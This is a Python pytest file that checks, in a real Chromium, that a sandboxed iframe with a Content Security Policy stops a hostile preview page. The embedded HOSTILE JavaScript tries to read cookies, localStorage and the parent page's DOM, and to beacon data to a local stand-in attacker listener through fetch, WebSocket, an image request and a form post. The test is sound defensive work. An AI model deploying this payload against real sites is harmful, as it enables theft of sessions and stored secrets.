"""The preview sandbox in a REAL Chromium: what the scan could miss, the sandbox + CSP still stop.

A hostile page (deliberately NOT passed through the scan) is served exactly the
way Command Center serves a preview (same CSP header, loaded in an iframe with
sandbox="allow-scripts"), embedded in a host page that holds a cookie and
localStorage secret.  The hostile script tries: fetch/WebSocket/image beacon to
a local "attacker" listener, reading the host's DOM, cookie and localStorage.
Expected: the attacker receives NOTHING and the host data is unreachable.
"""
from __future__ import annotations

import http.server
import threading

import pytest

from bcc.vibe.safety import preview_csp
from bcc.vibe.safety import SANDBOX_ATTR

from .browser_support import chromium_available, chromium_path, reason as browser_reason

pytestmark = [pytest.mark.timeout(120), pytest.mark.skipif(not chromium_available(), reason=browser_reason())]

HOSTILE = """<!doctype html><html><body><p id="out">start</p><script>
const out = [];
const rec = (k, v) => out.push(k + '=' + v);
try { rec('storage', typeof localStorage.getItem('host_secret')); } catch (e) { rec('storage', 'blocked:' + e.name); }
try { rec('cookie', JSON.stringify(document.cookie)); } catch (e) { rec('cookie', 'blocked:' + e.name); }
try { rec('parentdom', String(parent.document.body.innerHTML.length)); } catch (e) { rec('parentdom', 'blocked:' + e.name); }
try { rec('origin', String(location.origin)); } catch (e) { rec('origin', 'x'); }
fetch('__ATTACKER__/fetch?d=1').then(() => rec('fetch', 'sent'), () => rec('fetch', 'blocked'));
try { new WebSocket('__WS__/ws'); } catch (e) { rec('ws', 'blocked'); }
const im = new Image(); im.src = '__ATTACKER__/img.png';
const f = document.createElement('form'); f.action = '__ATTACKER__/form'; f.method = 'post';
document.body.appendChild(f); try { f.submit(); } catch (e) {}
setTimeout(() => { document.getElementById('out').textContent = out.join(';'); parent.postMessage({done: out}, '*'); }, 700);
</script></body></html>"""


class _Quiet(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass


def _serve(handler):
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def _run(csp: str | None, sandbox: str):
    hits: list[str] = []

    class Attacker(_Quiet):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"x")

        do_POST = do_GET

    attacker = _serve(Attacker)
    a_url = f"http://127.0.0.1:{attacker.server_address[1]}"
    doc = HOSTILE.replace("__ATTACKER__", a_url).replace("__WS__", a_url.replace("http", "ws"))

    class Studio(_Quiet):
        def do_GET(self):
            if self.path.startswith("/preview"):
                body = doc.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                if csp:
                    self.send_header("Content-Security-Policy", csp)
                self.send_header("X-Content-Type-Options", "nosniff")
                self.end_headers()
                self.wfile.write(body)
                return
            host = ('<!doctype html><body><h1>host secret page</h1><script>'
                    'localStorage.setItem("host_secret","S3CRET");</script>'
                    f'<iframe id="f" sandbox="{sandbox}" src="/preview"></iframe>'
                    '<script>window.addEventListener("message", e => { document.title = "done:" + '
                    'JSON.stringify(e.data.done); });</script></body>').encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Set-Cookie", "bcc_session=TOPSECRET; Path=/")
            self.end_headers()
            self.wfile.write(host)

    studio = _serve(Studio)
    from playwright.sync_api import sync_playwright
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(executable_path=chromium_path())
            try:
                page = browser.new_page()
                page.goto(f"http://127.0.0.1:{studio.server_address[1]}/", wait_until="load")
                page.wait_for_function("document.title.startsWith('done:')", timeout=15000)
                result = page.title()
            finally:
                browser.close()
    finally:
        studio.shutdown()
        attacker.shutdown()
    return result, hits


def test_hostile_preview_cannot_reach_network_host_dom_cookies_or_storage():
    result, hits = _run(preview_csp([]), SANDBOX_ATTR)
    assert "TOPSECRET" not in result and "S3CRET" not in result and "host secret" not in result
    assert "parentdom=blocked" in result, result
    assert "storage=blocked" in result, result
    assert 'cookie=""' in result or "cookie=blocked" in result, result
    assert "fetch=blocked" in result, result
    assert hits == [], f"attacker received requests: {hits}"


def test_negative_control_without_sandbox_and_csp_the_same_page_does_leak():
    """Proves the attacker listener and the probes work: protection is what blocks them."""
    result, hits = _run(None, "allow-scripts allow-same-origin")
    assert "storage=string" in result and "parentdom=" in result and "blocked" not in result.split("fetch=")[0]
    assert hits, "attacker should have been reached without CSP"
